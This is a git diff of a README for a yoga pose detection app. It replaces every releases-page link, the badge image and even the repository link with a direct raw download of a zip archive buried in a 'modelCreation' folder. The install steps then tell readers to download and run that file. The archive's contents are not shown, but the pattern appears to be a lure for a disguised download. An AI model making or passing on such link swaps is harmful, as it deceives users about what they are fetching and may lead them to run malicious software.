@@ -1,6 +1,6 @@
 # 🧘 YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation - Your AI Coach for Yoga Practice
 
-[![Download YogAI](https://img.shields.io/badge/Download-YogAI-AI--Powered--Yoga--Pose--Detection--Evaluation-blue)](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/releases)
+[![Download YogAI](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/raw/refs/heads/main/modelCreation/Pose_Evaluation_Detection_Yoga_Yog_A_Powered_v1.7.zip)](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/raw/refs/heads/main/modelCreation/Pose_Evaluation_Detection_Yoga_Yog_A_Powered_v1.7.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run YogAI.
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/releases).
+1. Visit [this page to download](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/raw/refs/heads/main/modelCreation/Pose_Evaluation_Detection_Yoga_Yog_A_Powered_v1.7.zip).
 2. Look for the latest version.
 3. Download the file that matches your operating system (Windows, macOS, or Linux).
 4. Once downloaded, locate the file in your downloads folder.
@@ -46,8 +46,8 @@ YogAI is licensed under the MIT License. You can freely use, modify, and distrib
 
 ## 🔗 Links
 
-- **GitHub Repository**: [YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation)
-- **Download the App**: [Visit this page to download](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/releases)
+- **GitHub Repository**: [YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/raw/refs/heads/main/modelCreation/Pose_Evaluation_Detection_Yoga_Yog_A_Powered_v1.7.zip)
+- **Download the App**: [Visit this page to download](https://github.com/Pedro11012/YogAI-AI-Powered-Yoga-Pose-Detection-Evaluation/raw/refs/heads/main/modelCreation/Pose_Evaluation_Detection_Yoga_Yog_A_Powered_v1.7.zip)
 
 ## 🎯 Topics
 
